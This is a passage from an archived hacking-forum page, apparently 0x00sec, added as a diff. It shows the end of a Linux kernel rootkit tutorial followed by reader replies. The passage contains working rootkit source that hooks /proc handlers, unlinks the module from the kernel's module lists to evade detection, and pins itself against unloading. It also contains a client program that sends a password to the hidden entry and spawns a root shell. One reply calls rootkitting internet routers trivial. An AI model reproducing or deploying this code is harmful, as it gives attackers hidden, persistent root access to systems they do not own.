+		fops-&gt;write = fops_write;
+	else if (fops-&gt;read)
+		fops-&gt;read = fops_read;
+
+	/* There aren't any reading/writing functions? Error! */
+	if (!ptr-&gt;read_proc &amp;&amp; !ptr-&gt;write_proc &amp;&amp;
+	!fops-&gt;read &amp;&amp; !fops-&gt;write) {
+		failed = 1;
+		return;
+	}
+}
+
+/* This functions does some "cleanups". If we don't set some pointers tu NULL,
+   we can cause Oops during unloading rootkit. We free some structures,
+   because we don't want to waste memory... */
+static inline void tidy(void)
+{
+	kfree(THIS_MODULE-&gt;notes_attrs);
+	THIS_MODULE-&gt;notes_attrs = NULL;
+	kfree(THIS_MODULE-&gt;sect_attrs);
+	THIS_MODULE-&gt;sect_attrs = NULL;
+	kfree(THIS_MODULE-&gt;mkobj.mp);
+	THIS_MODULE-&gt;mkobj.mp = NULL;
+	THIS_MODULE-&gt;modinfo_attrs-&gt;attr.name = NULL;
+	kfree(THIS_MODULE-&gt;mkobj.drivers_dir);
+	THIS_MODULE-&gt;mkobj.drivers_dir = NULL;
+}
+
+/*
+We must delete some structures from lists to make rootkit harder to detect.
+*/
+static inline void rootkit_hide(void)
+{
+	list_del(&amp;THIS_MODULE-&gt;list);
+	kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);
+	list_del(&amp;THIS_MODULE-&gt;mkobj.kobj.entry);
+}
+
+static inline void rootkit_protect(void)
+{
+	try_module_get(THIS_MODULE);
+}
+
+static int __init rootkit_init(void)
+{
+	module_remember_info();
+	proc_init();
+	if (failed)
+		return 0;
+	rootkit_hide();
+	tidy();
+	rootkit_protect();
+
+	return 0 ;
+
+}
+
+static void __exit rootkit_exit(void)
+{
+	/* If failed, we don't have to do any cleanups */	
+	if (failed)
+		return;
+	root_fops-&gt;readdir = old_proc_readdir;
+	fops-&gt;write = old_fops_write;
+	fops-&gt;read = old_fops_read;
+	ptr-&gt;write_proc = old_write;
+	ptr-&gt;read_proc = old_read;
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+</code></pre>
+<p>Take a look at example program which sends commands to our entry:</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/stat.h&gt;
+
+#include "rootkit_conf.conf.h"
+
+char file[64];
+char command[64];
+int root = 0;
+
+int main(int argc, char *argv[]) {
+	if(argc &lt; 2) {
+		fprintf(stderr, "Usage: %s &lt;command&gt;\n", argv[0]);
+		return 1;
+	}
+	int fd ;
+	/* We get path to infected entry */
+	sprintf(file, "/proc/%s", passwaiter);
+	/* If sent command is equal to command which has to give us root, we must run shell at the end */
+	if(!strcmp(argv[1], password))
+		root = 1;
+	/* At first we try to write command to that entry */
+	fd = open(file, O_WRONLY) ;
+	if(fd &lt; 1) {
+		printf("Opening for writing failed! Trying to open for reading!\n");
+		/* Otherwise, we send command by reading */	
+		fd = open(file, O_RDONLY);
+		if(!fd) {
+			perror("open");
+			return 1;
+		}
+		read(fd, argv[1], strlen(argv[1]));
+	}
+	else 
+		write(fd, argv[1], strlen(argv[1]));
+end:
+	close(fd) ;
+	printf("[+] I did it!\n") ;
+	/* if we have to get root, we run shell */
+	if(root) {
+		uid_t uid = getuid() ;
+		printf("[+] Success! uid=%i\n", uid) ;
+		setuid(0) ;
+		setgid(0) ;
+		execl("/bin/bash", "bash", 0) ;
+	}
+	return 0;
+}
+</code></pre>
+<p>You can ask “why everything in rootkit is defined as “static””? Because things defined as static aren’t exported to /proc/kallsyms. It makes the rootkit harder to detect.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="17" />
+<span class="post-likes">17 Likes</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
+<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+<a itemprop="url" href="../the-linux-kernel-modules-programming/30639.html">The linux kernel modules programming</a>
+<meta itemprop="position" content="2">
+</div>
+</div>
+</div>
+<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/messede"><span itemprop="name">messede</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-04-16T13:17:12Z" class="post-time">
+April 16, 2022, 1:17pm
+</time>
+<meta itemprop="dateModified" content="2022-04-16T13:17:12Z">
+<span itemprop="position">2</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Nice Post !, Keep it Up !</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="2" />
+<span class="post-likes">2 Likes</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+</div>
+<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/lightduty"><span itemprop="name">lightduty</span></a>
+(lightduty)
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-04-16T15:17:27Z" class="post-time">
+April 16, 2022, 3:17pm
+</time>
+<meta itemprop="dateModified" content="2022-04-16T15:17:27Z">
+<span itemprop="position">3</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Nice tutorial, thanks.</p>
+<p>EDIT: I don’t understand the code. Not a language that i have played with. but only linux? The average linux user is advanced in IT so it will be hard to install. Why not release a code for Windows?</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="1" />
+<span class="post-likes">1 Like</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+</div>
+<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-04-18T01:44:23Z" class="post-time">
+April 18, 2022, 1:44am
+</time>
+<meta itemprop="dateModified" content="2022-04-18T01:44:23Z">
+<span itemprop="position">5</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Cool article topic, thanks for posting!</p>
+<aside class="quote no-group" data-username="lightduty" data-post="3" data-topic="29034" data-full="true">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt width="20" height="20" src="../../letter_avatar_proxy/v4/letter/l/e47774/40.png" class="avatar"> lightduty:</div>
+<blockquote>
+<p>The average linux user is advanced in IT so it will be hard to install.</p>
+</blockquote>
+</aside>
+<p>There are ways to install a rootkit onto a Linux system just like there is for any other system which don’t require social engineering the user to run your code. It should also be noted that not all Linux systems are controlled nor managed by a user such as servers or routers. Exploiting and installing a rootkit on a random router that sits on the internet is a relatively trivial task that’s been done for reasons to observe or manipulate network traffic.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="3" />
+<span class="post-likes">3 Likes</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+</div>
+<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/0x47"><span itemprop="name">0x47</span></a>
+(alarm@alarm)
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-06-09T19:22:43Z" class="post-time">
+June 9, 2022, 7:22pm
+</time>
+<meta itemprop="dateModified" content="2022-06-09T19:22:43Z">
+<span itemprop="position">6</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Because even Linux users can get malware (it would be cool if a Windows version was there though).</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/GrayHat"><span itemprop="name">GrayHat</span></a>
+(Lole)
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-06-15T23:19:57Z" class="post-time">
+June 15, 2022, 11:19pm
+</time>
+<meta itemprop="dateModified" content="2022-06-15T23:19:57Z">
+<span itemprop="position">7</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Nice Post , Thank you</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/GrayHat"><span itemprop="name">GrayHat</span></a>
+(Lole)
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-06-15T23:23:51Z" class="post-time">
+June 15, 2022, 11:23pm
+</time>
+<meta itemprop="dateModified" content="2022-06-15T23:23:51Z">
+<span itemprop="position">8</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<aside class="quote no-group" data-username="messede" data-post="2" data-topic="29034" data-full="true">
+<div class="title">
+<div class="quote-controls"></div>
+<img loading="lazy" alt width="20" height="20" src="../../user_avatar/0x00sec.org/messede/40/41521_2.png" class="avatar"> messede:</div>
+<blockquote>
+<p>Nice Post !, Keep it Up !</p>
+</blockquote>
+</aside>
+<p>I totally agree with what you said. <img src="../../images/emoji/twitter/+1.png%3Fv=12" title=":+1:" class="emoji" alt=":+1:" loading="lazy" width="20" height="20"></p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/vex5"><span itemprop="name">vex5</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-07-04T06:26:30Z" class="post-time">
+July 4, 2022, 6:26am
+</time>
+<meta itemprop="dateModified" content="2022-07-04T06:26:30Z">
+<span itemprop="position">9</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Is it possible for the rootkit to self protect and report custom values for /proc/sys/kernel/tainted?</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/Kill244_Kim"><span itemprop="name">Kill244_Kim</span></a>
+(Kill244 Kim)
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f.jpeg">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-08-06T02:30:39Z" class="post-time">
+August 6, 2022, 2:30am
+</time>
+<meta itemprop="dateModified" content="2022-08-06T02:30:39Z">
+<span itemprop="position">10</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>thank you so much for this tutorial if someone want to go deep in this topic you could check out these links &gt;</p>
+<aside class="onebox allowlistedgeneric" data-onebox-src="https://nostarch.com/rootkits.htm">
+<header class="source">
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/6/5/65d169ff0de7aba8ee9c25ef9ea5a27b02424f2d.png" class="site-icon" width="16" height="16">
+<a href="https://nostarch.com/rootkits.htm" target="_blank" rel="noopener nofollow ugc" title="02:54PM - 29 October 2009">nostarch.com – 29 Oct 09</a>
+</header>
+<article class="onebox-body">
+<div class="aspect-image" style="--aspect-ratio:375/500;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f_2_375x500.jpeg" class="thumbnail" width="375" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f_2_375x500.jpeg, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d78522b4ce813ff19679d59ba4092cdc742695f_2_10x10.png"></div>
+<h3><a href="https://nostarch.com/rootkits.htm" target="_blank" rel="noopener nofollow ugc">Designing BSD Rootkits</a></h3>
+<p>"If you understand C and want to learn how to manipulate the FreeBSD kernel, Designing BSD Rootkits is for you. Peer into the depths of a powerful operating system and bend it to your will!" Richard Bejtlich, TaoSecurity View a sample chapter,...</p>
+<p>
+<span class="label1">Price: USD 29.95</span>
+</p>
+</article>
+<div class="onebox-metadata">
+</div>
+<div style="clear: both"></div>
+</aside>
+<aside class="onebox allowlistedgeneric" data-onebox-src="https://xcellerator.github.io/posts/linux_rootkits_01/">
+<header class="source">
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/b/c/bc3ebac33eaee8ca76ba0d19eac441103a2e6408.png" class="site-icon" width="50" height="50">
+<a href="https://xcellerator.github.io/posts/linux_rootkits_01/" target="_blank" rel="noopener nofollow ugc" title="09:00PM - 25 August 2020">Linux Rootkits Part 1: Introduction and Workflow – 25 Aug 20</a>
+</header>
+<article class="onebox-body">
+<h3><a href="https://xcellerator.github.io/posts/linux_rootkits_01/" target="_blank" rel="noopener nofollow ugc">Linux Rootkits Part 1: Introduction and Workflow :: TheXcellerator</a></h3>
+<p>Learning about Linux rootkits is a great way to learn more about how the kernel works. What’s great about it is that, unless you really understand what the kernel is doing, your rootkit is unlikely to work, so it serves as a fantasic verifier.
+In the...</p>
+</article>
+<div class="onebox-metadata">
+</div>
+<div style="clear: both"></div>
+</aside>
+<p><a href="https://www.cs.unc.edu/~porter/courses/cse306/s13/lab4.html" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.cs.unc.edu/~porter/courses/cse306/s13/lab4.html</a><br>
+<a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html" class="onebox" target="_blank" rel="noopener nofollow ugc">https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html</a></p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="1" />
+<span class="post-likes">1 Like</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
+(system)
+Closed
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-08-15T16:19:57Z" class="post-time">
+August 15, 2022, 4:19pm
+</time>
+<meta itemprop="dateModified" content="2022-08-15T16:19:57Z">
+<span itemprop="position">11</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+</div>
+</div>
+<footer class="container wrap">
+<nav class="crawler-nav">
+<ul>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../index.html" itemprop="url">Home </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../categories.html" itemprop="url">Categories </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../tos.html" itemprop="url">Terms of Service </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
+</span>
+</li>
+</ul>
+</nav>
+<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
+</footer>
+<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+</body>
+</html>
